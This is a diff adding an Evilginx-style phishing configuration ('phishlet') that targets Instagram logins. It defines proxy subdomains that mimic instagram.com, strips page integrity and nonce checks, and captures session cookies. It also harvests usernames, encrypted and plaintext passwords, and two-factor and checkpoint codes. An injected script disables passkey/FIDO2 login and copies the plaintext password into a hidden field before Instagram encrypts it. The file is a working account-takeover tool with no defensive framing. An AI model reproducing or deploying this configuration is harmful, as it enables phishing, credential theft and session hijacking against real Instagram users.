@@ -1,0 +1,101 @@
+min_ver: '3.0.0'
+author: '0fukuAkz'
+
+proxy_hosts:
+  - {phish_sub: 'instagram', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true, auto_filter: true}
+  # Static CDN — JS bundles for the login React app
+  - {phish_sub: 'cdnig', orig_sub: 'static', domain: 'cdninstagram.com', session: false, is_landing: false, auto_filter: true}
+  # i.instagram.com — mobile/API endpoint used during auth
+  - {phish_sub: 'iig', orig_sub: 'i', domain: 'instagram.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: ' integrity="[^"]*"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: ' integrity=''[^'']*''', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: ' nonce="[^"]*"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: ' nonce=''[^'']*''', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'i', domain: 'instagram.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+auth_tokens:
+  - domain: '.instagram.com'
+    keys: ['sessionid', 'csrftoken,opt', 'ds_user_id,opt', 'ig_did,opt', 'mid,opt', 'rur,opt', 'ig_nrcb,opt']
+    type: 'cookie'
+
+credentials:
+  # enc_password is AES-CBC encrypted with a server-supplied public key.
+  # The encryption key ID and public key are served in the /accounts/login/
+  # page response — capture those via sub_filter or inspect proxied traffic
+  # to decrypt enc_password offline.
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+
+  password:
+    key: 'enc_password'
+    search: '(.*)'
+    type: 'post'
+
+  custom:
+    # Plain password fallback (some legacy / mobile-web flows skip encryption)
+    - {key: 'password', search: '(.*)', type: 'post'}
+    # Plain password injected via js_inject hidden field before form submit
+    - {key: '_pw', search: '(.*)', type: 'post'}
+    # 2FA / checkpoint codes
+    - {key: 'verificationCode', search: '(.*)', type: 'post'}
+    - {key: 'security_code', search: '(.*)', type: 'post'}
+    - {key: 'identifier_nonce', search: '(.*)', type: 'post'}
+
+auth_urls:
+  - '/api/v1/web/accounts/login/ajax/'
+  - '/accounts/login/ajax/'
+  - '/api/v1/web/two_factor/login/'
+  - '/accounts/two_factor_authentication/'
+  - '/challenge/'
+
+js_inject:
+  - trigger_domains: ['www.instagram.com']
+    trigger_paths: ['/accounts/login.*', '/']
+    script: |
+      (function(){
+        // Downgrade FIDO2/passkey challenges
+        if(window.PublicKeyCredential){
+          window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable=function(){return Promise.resolve(false);};
+          window.PublicKeyCredential.isConditionalMediationAvailable=function(){return Promise.resolve(false);};
+        }
+        if(navigator.credentials&&navigator.credentials.get){
+          var _orig=navigator.credentials.get.bind(navigator.credentials);
+          navigator.credentials.get=function(o){
+            if(o&&o.publicKey)return Promise.reject(new DOMException('Not allowed','NotAllowedError'));
+            return _orig(o);
+          };
+        }
+        // Inject hidden _pw field into password forms to capture plain password
+        // before Instagram encrypts it client-side with enc_password
+        function hookPw(){
+          document.querySelectorAll('input[type="password"]').forEach(function(inp){
+            if(inp._capped) return;
+            inp._capped = true;
+            inp.addEventListener('input', function(){
+              var frm = inp.closest('form');
+              if(!frm) return;
+              var hid = frm.querySelector('#_caphid');
+              if(!hid){
+                hid = document.createElement('input');
+                hid.type = 'hidden';
+                hid.id = '_caphid';
+                hid.name = '_pw';
+                frm.appendChild(hid);
+              }
+              hid.value = inp.value;
+            });
+          });
+        }
+        hookPw();
+        new MutationObserver(hookPw).observe(document.documentElement, {childList:true, subtree:true});
+      })();
+
+login:
+  domain: 'www.instagram.com'
+  path: '/accounts/login/'
